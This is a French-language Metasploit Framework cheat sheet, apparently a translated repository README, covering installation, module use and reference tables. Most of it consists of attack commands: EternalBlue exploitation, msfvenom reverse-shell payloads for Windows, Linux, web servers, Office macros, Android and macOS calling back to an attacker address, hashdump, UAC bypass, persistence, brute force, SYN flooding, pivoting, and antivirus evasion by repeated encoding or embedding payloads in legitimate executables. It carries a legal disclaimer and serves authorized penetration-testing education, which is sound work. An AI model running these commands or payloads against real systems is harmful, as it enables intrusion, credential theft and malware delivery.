# 🔴 Metasploit Framework — fiche pratique complète

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Le framework de test d’intrusion le plus utilisé au monde, selon le document source** — Guide complet pour maîtriser Metasploit

> **Précisions de version :** les nombres de modules et certains noms de modules sont des instantanés du document source. Les commandes et chemins sont conservés ; vérifiez les options avec l’aide de votre version. Les modalités d’installation dépendent de la plateforme ; voir les [installateurs officiels Rapid7](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). Un [encodage n’assure pas un contournement antivirus](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/) : sa fonction première est d’éviter les octets incompatibles avec un exploit. Les exemples `msfdb reinit` réinitialisent la base : ce n’est pas une simple reconnexion.

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Vue d’ensemble de l’architecture](#-vue-densemble-de-larchitecture)
- [Démarrage de Metasploit](#-démarrage-de-metasploit)
- [Commandes de base](#-commandes-de-base)
- [Types de modules](#-types-de-modules)
- [Déroulement d’une exploitation](#-déroulement-dune-exploitation)
- [Intégration de la base de données](#-intégration-de-la-base-de-données)
- [Analyse et énumération](#-analyse-et-énumération)
- [Génération de charges utiles (msfvenom)](#-génération-de-charges-utiles-msfvenom)
- [Post-exploitation](#-post-exploitation)
- [Modules auxiliaires](#-modules-auxiliaires)
- [Exemples pratiques](#-exemples-pratiques)
- [Tableaux de référence rapide](#-tableaux-de-référence-rapide)
- [Conseils et bonnes pratiques](#-conseils-et-bonnes-pratiques)
- [Ressources](#-ressources)

---

## 🎯 Introduction

**Metasploit Framework** est une plateforme libre de test d’intrusion et de développement d’exploits. Elle propose :

- 🔍 **Collecte d’informations** et recherche de vulnérabilités
- 💉 **Développement** et mise en œuvre d’exploits
- 🎭 **Génération de charges utiles** pour plusieurs plateformes
- 🔐 Outils et techniques de **post-exploitation**
- 📊 Fonctions de **rapport** et de documentation

### Principaux composants

| Composant | Description |
|-----------|-------------|
| `msfconsole` | Interface principale en ligne de commande |
| `msfvenom` | Générateur et encodeur de charges utiles |
| `msfdb` | Utilitaire de gestion de la base de données |
| `msfrpcd` | Démon RPC pour l’accès distant |

---

## 📥 Installation

### Kali Linux (préinstallé)
```bash
# Mettre Metasploit à jour
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Installer les dépendances
sudo apt install curl gnupg2 software-properties-common

# Ajouter le dépôt Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (déconseillé en production dans le document source)
```powershell
# Télécharger l’installateur depuis : https://windows.metasploit.com/
# Exécuter l’installateur et suivre les instructions
```

---

<a id="-vue-densemble-de-larchitecture"></a>
## 🏗️ Vue d’ensemble de l’architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      INTERFACES                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

### Arborescence des répertoires
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Modules d’exploitation
│   ├── payloads/      # Modules de charges utiles
│   ├── auxiliary/     # Analyse, fuzzing, etc.
│   ├── post/          # Post-exploitation
│   ├── encoders/      # Encodeurs de charges utiles
│   ├── nops/          # Générateurs de NOP
│   └── evasion/       # Modules d’évasion antivirus
├── tools/             # Outils supplémentaires
├── scripts/           # Scripts Meterpreter
├── data/              # Listes de mots et modèles
└── plugins/           # Extensions de la console
```

---

## 🚀 Démarrage de Metasploit

### Initialiser la base de données (première utilisation)
```bash
# Démarrer le service PostgreSQL
sudo systemctl start postgresql

# Initialiser la base de données
sudo msfdb init

# Vérifier l’état de la base de données
sudo msfdb status
```

### Lancer msfconsole
```bash
# Démarrage standard
msfconsole

# Mode silencieux (sans bannière)
msfconsole -q

# Exécuter des commandes au démarrage
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Charger un fichier de ressources
msfconsole -r commands.rc
```

---

<a id="-commandes-de-base"></a>
## ⌨️ Commandes de base

### Navigation et aide

| Commande | Description |
|---------|-------------|
| `help` ou `?` | Afficher le menu d’aide |
| `help <command>` | Aide d’une commande précise |
| `search <term>` | Rechercher des modules par nom, CVE ou plateforme |
| `use <module>` | Sélectionner un module |
| `back` | Quitter le module courant |
| `info` | Afficher les informations du module |
| `show options` | Afficher les options du module |
| `show advanced` | Afficher les options avancées |
| `show payloads` | Lister les charges utiles compatibles |
| `show targets` | Lister les cibles disponibles |

### Configuration des modules

```bash
# Définir les options
set RHOSTS 192.168.1.100          # Adresse IP cible
set RPORT 445                      # Port cible
set LHOST 192.168.1.50            # Adresse IP locale (attaquant)
set LPORT 4444                     # Port local (récepteur)
set PAYLOAD windows/meterpreter/reverse_tcp

# Définir globalement (valeur conservée entre les modules)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Supprimer la valeur des options
unset RHOSTS
unsetg LHOST

# Vérifier la configuration actuelle
show options
check                              # Vérifier si la cible est vulnérable
```

### Exécution

```bash
# Exécuter l’exploit
exploit
run

# Exécuter en arrière-plan
exploit -j

# Exécuter avec des options précises
exploit -z                         # Ne pas interagir avec la session après réussite
```

### Gestion des sessions

```bash
# Lister les sessions
sessions
sessions -l

# Interagir avec une session
sessions -i 1

# Terminer une session
sessions -k 1

# Terminer toutes les sessions
sessions -K

# Transformer une session shell en session Meterpreter
sessions -u 1

# Exécuter une commande sur toutes les sessions
sessions -c "sysinfo"
```

---

## 📦 Types de modules

### 1. Exploits
Modules qui exploitent des vulnérabilités.

```bash
# Rechercher des exploits
search type:exploit platform:windows

# Exemple
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Charges utiles (payloads)
Code exécuté après la réussite de l’exploitation.

**Types :**
- **Singles** — Charges utiles autonomes
- **Stagers** — Établissent la connexion entre l’attaquant et la cible
- **Stages** — Composants téléchargés par les stagers, par exemple Meterpreter

```bash
# Lister les charges utiles
show payloads

# Convention de nommage des charges utiles
<platform>/<arch>/<type>/<connection>
# Exemple : windows/x64/meterpreter/reverse_tcp
```

### 3. Modules auxiliaires
Analyse, fuzzing (tests par entrées variées), capture du trafic et autres fonctions.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Modules de post-exploitation
Modules de post-exploitation.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encodeurs
Encodent les charges utiles pour tenter d’éviter leur détection, selon le document source.

```bash
show encoders
# Exemple : x86/shikata_ga_nai
```

---

## 🎯 Déroulement d’une exploitation

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON &    │───▶│    SELECT    │───▶│  CONFIGURE   │
│  ENUMERATION │    │    MODULE    │    │   OPTIONS    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   EXPLOIT    │◀───│    CHECK     │
│ EXPLOITATION │    │    TARGET    │    │    TARGET    │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Exemple pas à pas

```bash
# 1. Rechercher un exploit
msf6 > search eternalblue

# 2. Sélectionner un module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Afficher les options
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Définir la cible
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Définir la charge utile
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Configurer le récepteur
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Vérifier la vulnérabilité (facultatif)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Exécuter
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-intégration-de-la-base-de-données"></a>
## 🗄️ Intégration de la base de données

### Configuration et connexion

```bash
# Initialiser la base de données
msfdb init

# Se connecter à la base de données
db_connect msf:password@127.0.0.1/msf

# Vérifier l’état
db_status

# Se déconnecter
db_disconnect
```

### Gestion des espaces de travail

```bash
# Lister les espaces de travail
workspace

# Créer un espace de travail
workspace -a pentest_project

# Changer d’espace de travail
workspace pentest_project

# Supprimer un espace de travail
workspace -d old_project

# Renommer un espace de travail
workspace -r old_name new_name
```

### Gestion des hôtes

```bash
# Lister les hôtes
hosts

# Ajouter un hôte manuellement
hosts -a 192.168.1.100

# Supprimer un hôte
hosts -d 192.168.1.100

# Rechercher des hôtes
hosts -S windows

# Exporter les hôtes
hosts -o /tmp/hosts.csv
```

### Gestion des services

```bash
# Lister les services
services

# Filtrer par port
services -p 80,443

# Filtrer par nom de service
services -s http

# Rechercher des services
services -S microsoft
```

### Gestion des vulnérabilités

```bash
# Lister les vulnérabilités
vulns

# Ajouter une vulnérabilité
vulns -a 192.168.1.100 -n "MS17-010"
```

### Import/Export

```bash
# Importer une analyse Nmap
db_import /path/to/nmap_scan.xml

# Importer une analyse Nessus
db_import /path/to/nessus_scan.nessus

# Exécuter Nmap directement
db_nmap -sV -O 192.168.1.0/24

# Exporter les données
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Analyse et énumération

### Analyse des ports

```bash
# Analyse TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Analyse par connexion TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Énumération des services

```bash
# Énumération SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Partages SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Version de SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Version de HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Énumération FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Recherche de vulnérabilités

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Analyseur de vulnérabilités HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Génération de charges utiles (msfvenom)

### Syntaxe de base
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Options courantes

| Option | Description |
|--------|-------------|
| `-p` | Charge utile à utiliser |
| `-f` | Format de sortie |
| `-o` | Fichier de sortie |
| `-e` | Encodeur à utiliser |
| `-i` | Nombre d’itérations d’encodage |
| `-b` | Octets interdits à éviter |
| `-n` | Taille de la séquence de NOP |
| `--platform` | Plateforme cible |
| `-a` | Architecture |
| `LHOST` | Adresse IP du récepteur |
| `LPORT` | Port du récepteur |

### Charges utiles Windows

```bash
# Connexion TCP inverse (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Connexion TCP inverse (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Connexion HTTPS inverse (chiffrée)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Écoute TCP sur la cible (bind)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Avec encodage (évasion antivirus dans le document source)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Charges utiles Linux

```bash
# Connexion TCP inverse
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Connexion TCP inverse (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Shell en écoute sur la cible
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Charges utiles web

```bash
# Shell inversé PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Shell inversé ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Shell inversé ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Shell inversé JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# Fichier WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Charges utiles pour les langages de script

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Charges utiles Android

```bash
# Connexion TCP inverse Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Charges utiles macOS

```bash
# Connexion TCP inverse macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Configuration du gestionnaire multi/handler

```bash
# Démarrer le récepteur
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Post-exploitation

### Modules de post-exploitation de base

```bash
# Obtenir les informations système
use post/windows/gather/enum_system

# Obtenir les utilisateurs connectés
use post/windows/gather/enum_logged_on_users

# Extraire les empreintes de mots de passe
use post/windows/gather/hashdump

# Identifiants présents en mémoire
use post/windows/gather/credentials/credential_collector

# Vérifier la présence d’une machine virtuelle
use post/windows/gather/checkvm
```

### Élévation de privilèges

```bash
# Recherche de possibilités d’élévation sous Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Contournement de l’UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Obtenir SYSTEM
use post/windows/escalate/getsystem
```

### Persistance

```bash
# Persistance dans le Registre
use exploit/windows/local/persistence_service
set SESSION 1
run

# Persistance par tâche planifiée
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Modules auxiliaires

### Force brute

```bash
# Force brute SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Force brute SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Force brute FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Capture du trafic (sniffing)

```bash
# Capture de mots de passe HTTP
use auxiliary/sniffer/psnuffle
run

# Capturer des paquets
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### Déni de service (tests uniquement)

```bash
# Saturation par paquets SYN
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Exemples pratiques

### Exemple 1 : attaque EternalBlue (MS17-010)

```bash
# Démarrer Metasploit
msfconsole -q

# Rechercher un exploit
search eternalblue

# Utiliser l’exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurer
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Vérifier si la cible est vulnérable
check

# Exploiter
exploit
```

### Exemple 2 : attaque d’une application web

```bash
# Rechercher des vulnérabilités
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Exploiter le téléversement de fichiers
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Exemple 3 : gestionnaire multi/handler avec msfvenom

```bash
# Terminal 1 : générer la charge utile
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2 : démarrer le gestionnaire
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Transférer payload.exe vers la cible et l’exécuter
# La session se connectera au gestionnaire
```

### Exemple 4 : rebond via un hôte compromis

```bash
# Après l’obtention d’une session Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# Ou depuis msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Analyser ensuite le réseau interne
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Tableaux de référence rapide

### Commandes essentielles

| Commande | Description |
|---------|-------------|
| `search <term>` | Rechercher des modules |
| `use <module>` | Sélectionner un module |
| `show options` | Afficher les options |
| `set <opt> <val>` | Définir la valeur d’une option |
| `exploit` / `run` | Exécuter le module |
| `back` | Revenir à la console principale |
| `sessions -l` | Lister les sessions |
| `sessions -i <id>` | Interagir avec une session |

### Charges utiles courantes

| Charge utile | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Meterpreter Windows (32 bits) |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter Windows (64 bits) |
| `windows/meterpreter/reverse_https` | Connexion chiffrée |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter PHP |
| `java/jsp_shell_reverse_tcp` | Interpréteur de commandes Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter Android |

### Formats de sortie (msfvenom)

| Format | Extension | Utilisation |
|--------|-----------|----------|
| `exe` | .exe | Exécutable Windows |
| `elf` | (aucune) | Exécutable Linux |
| `macho` | (aucune) | Exécutable macOS |
| `raw` | variable | Shellcode brut |
| `asp` | .asp | Serveur web IIS |
| `aspx` | .aspx | Serveur web .NET |
| `php` | .php | Serveur web PHP |
| `jsp` | .jsp | Serveur web Java |
| `war` | .war | Déploiement Tomcat |
| `psh` | .ps1 | Script PowerShell |
| `vba` | .vba | Macro Office |
| `dll` | .dll | Bibliothèque Windows |

### Encodeurs courants

| Encodeur | Description |
|---------|-------------|
| `x86/shikata_ga_nai` | Encodeur XOR polymorphe |
| `x64/xor` | Encodeur XOR (64 bits) |
| `x86/alpha_mixed` | Encodeur alphanumérique |
| `php/base64` | Encodeur PHP Base64 |

---

## 💡 Conseils et bonnes pratiques

### ⚠️ Avertissement juridique
> **IMPORTANT :** utilisez Metasploit uniquement sur les systèmes qui vous appartiennent ou pour lesquels vous disposez d’une autorisation écrite explicite. L’accès non autorisé aux systèmes informatiques est illégal.

### Conseils de performance

1. **Utiliser la base de données**
   ```bash
   # Toujours initialiser et utiliser la base de données
   msfdb init
   db_status
   ```

2. **Utiliser les espaces de travail**
   ```bash
   workspace -a client_pentest
   ```

3. **Utiliser les scripts de ressources**
   ```bash
   # Enregistrer les commandes dans un fichier .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Exécuter le script
   msfconsole -r handler.rc
   ```

4. **Choisir prudemment le nombre de threads**
   ```bash
   set THREADS 10  # Ne pas surcharger la cible
   ```

### Techniques d’évasion

1. **Encodages multiples**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Modèles personnalisés**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Utiliser des charges utiles HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Dépannage

| Problème | Solution |
|-------|----------|
| Impossible de se connecter à la base de données | `msfdb reinit` |
| Le module ne se charge pas | `reload_all` |
| La session s’arrête immédiatement | Vérifier l’antivirus, utiliser une charge utile encodée (conseil du document source) |
| L’exploit échoue | Vérifier la version du système cible et essayer une autre cible compatible |

---

## 📚 Ressources

### Documentation officielle
- [Documentation Metasploit](https://docs.metasploit.com/)
- [Blog Rapid7](https://www.rapid7.com/blog/)
- [Metasploit sur GitHub](https://github.com/rapid7/metasploit-framework)

### Ressources d’apprentissage
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Fiches pratiques
- [Fiche Metasploit SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Fiche Meterpreter](./Meterpreter.fr.md)

---

## 📄 Licence

Cette fiche est fournie à des fins pédagogiques uniquement. Utilisez-la de manière responsable et éthique.

---

<p align="center">
  <b>Bonne pratique du hacking ! 🔴</b><br>
  <i>N’oubliez pas : de grands pouvoirs impliquent de grandes responsabilités</i>
</p>
